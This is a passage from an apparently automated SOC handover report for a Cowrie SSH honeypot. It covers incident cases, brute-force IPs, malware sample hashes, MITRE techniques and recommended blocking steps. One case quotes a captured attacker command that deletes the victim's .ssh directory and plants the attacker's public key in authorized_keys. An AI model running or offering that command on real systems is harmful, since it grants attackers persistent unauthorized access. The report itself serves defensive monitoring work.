| `2026-04-07 05:40:37` | `cowrie.client.version` |
| `2026-04-07 05:40:37` | `cowrie.client.kex` |
| `2026-04-07 05:40:37` | `cowrie.login.success` |
| `2026-04-07 05:40:37` | `cowrie.session.params` |
| `2026-04-07 05:40:37` | `cowrie.command.input` |
| `2026-04-07 05:40:37` | `cowrie.command.failed` |
| `2026-04-07 05:40:38` | `cowrie.log.closed` |
| `2026-04-07 05:40:38` | `cowrie.session.params` |
| `2026-04-07 05:40:38` | `cowrie.command.input` |
| `2026-04-07 05:40:38` | `cowrie.session.file_download` |
| `2026-04-07 05:40:38` | `cowrie.log.closed` |
| `2026-04-07 05:40:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54f171f4531d

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:40 |
| **Last Seen** | 2026-04-07 05:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:40:40` | `cowrie.session.connect` |
| `2026-04-07 05:40:40` | `cowrie.client.version` |
| `2026-04-07 05:40:40` | `cowrie.client.kex` |
| `2026-04-07 05:40:40` | `cowrie.login.success` |
| `2026-04-07 05:40:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24c2fa04411b

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:42 |
| **Last Seen** | 2026-04-07 05:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:42:25` | `cowrie.session.connect` |
| `2026-04-07 05:42:25` | `cowrie.client.version` |
| `2026-04-07 05:42:25` | `cowrie.client.kex` |
| `2026-04-07 05:42:25` | `cowrie.login.success` |
| `2026-04-07 05:42:26` | `cowrie.session.params` |
| `2026-04-07 05:42:26` | `cowrie.command.input` |
| `2026-04-07 05:42:26` | `cowrie.command.failed` |
| `2026-04-07 05:42:26` | `cowrie.log.closed` |
| `2026-04-07 05:42:26` | `cowrie.session.params` |
| `2026-04-07 05:42:26` | `cowrie.command.input` |
| `2026-04-07 05:42:26` | `cowrie.session.file_download` |
| `2026-04-07 05:42:26` | `cowrie.log.closed` |
| `2026-04-07 05:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-914213d77b5d

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:42 |
| **Last Seen** | 2026-04-07 05:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:42:28` | `cowrie.session.connect` |
| `2026-04-07 05:42:28` | `cowrie.client.version` |
| `2026-04-07 05:42:28` | `cowrie.client.kex` |
| `2026-04-07 05:42:28` | `cowrie.login.success` |
| `2026-04-07 05:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `20.0.164[.]98` | **32** | 2026-04-07 02:07 | 2026-04-07 03:50 | 16m | 0 | `T1592` | 🟠 MEDIUM |
| `27.128.171[.]39` | **26** | 2026-04-07 02:53 | 2026-04-07 03:06 | 42m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `117.6.44[.]221` | **25** | 2026-04-07 04:59 | 2026-04-07 05:44 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `158.69.194[.]34` | **25** | 2026-04-07 04:59 | 2026-04-07 05:37 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `82.152.132[.]24` | **25** | 2026-04-07 05:05 | 2026-04-07 05:44 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `3.129.187[.]38` | **6** | 2026-04-07 04:28 | 2026-04-07 04:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.143.162[.]210` | **5** | 2026-04-07 03:55 | 2026-04-07 03:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.163.10[.]187` | **2** | 2026-04-07 03:01 | 2026-04-07 03:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.119.94[.]10` | 1 | 2026-04-07 05:02 | 2026-04-07 05:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `142.93.9[.]201` | 1 | 2026-04-07 02:59 | 2026-04-07 02:59 | 10s | 0 | `T1592` | 🟢 LOW |
| `180.76.172[.]156` | 1 | 2026-04-07 04:38 | 2026-04-07 04:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.43.76[.]81` | 1 | 2026-04-07 05:05 | 2026-04-07 05:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]28` | 1 | 2026-04-07 02:39 | 2026-04-07 02:39 | 7s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `142.93.9[.]201` | US | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `3.143.162[.]210` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `71.6.232[.]28` | US | CariNet, Inc. | **100** ⚠️ | 50 |
| `158.69.194[.]34` | CA | OVH Hosting, Inc. | **100** ⚠️ | 50 |
| `27.128.171[.]39` | CN | CHINANET hebei province network | **100** ⚠️ | 50 |
| `82.152.132[.]24` | RO | GCI Network Solutions Limited | **100** ⚠️ | 7 |
| `182.43.76[.]81` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 15 |
| `20.0.164[.]98` | GB | Microsoft Corporation | **100** ⚠️ | 0 |
| `3.129.187[.]38` | US | Amazon Technologies Inc. | **100** ⚠️ | 0 |
| `20.163.10[.]187` | US | Microsoft Corporation | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 193 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 81 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 79 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 40 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 40 |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 240 cases |
| Tool 34  | Credential Extractor        | ✅ 160 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 19 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 10 filtered (4.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 79 priority case(s) shown individually · 13 recon entry/entries in table (8 group(s) consolidating 146 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-07T05:47:00Z_
